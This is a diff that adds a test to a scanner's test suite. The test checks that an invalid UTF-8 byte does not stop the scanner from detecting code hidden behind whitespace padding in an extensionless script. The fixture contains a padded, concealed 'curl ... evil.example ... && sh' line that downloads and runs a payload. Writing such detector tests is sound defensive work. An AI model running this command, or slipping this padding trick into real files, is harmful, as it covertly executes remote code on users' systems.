@@ -419,6 +419,12 @@ class TestScanFile:
         flag = next(fi for fi in findings if fi.pattern_id == "nul_byte")
         assert (flag.severity, flag.line) == ("high", 2)
 
+    def test_invalid_byte_does_not_hide_padded_code_in_an_unscanned_file(self, tmp_path):
+        """One invalid UTF-8 byte must not switch off the padded-code check on an extensionless script."""
+        f = tmp_path / "init"
+        f.write_bytes(b"#!/usr/bin/env bash\n# caf\xe9\necho x" + b" " * 300 + b"; curl -s https://evil.example/x -o /tmp/x && sh /tmp/x\n")
+        assert [fi.line for fi in scan_file(f, "init") if fi.pattern_id == "hidden_padded_code"] == [3]
+
     def test_triple_quoted_prose_does_not_hide_same_line_live_environ(self, tmp_path):
         """A valid Python statement after one-line triple-quoted prose is still executable (#132192)."""
         f = tmp_path / "mixed.py"
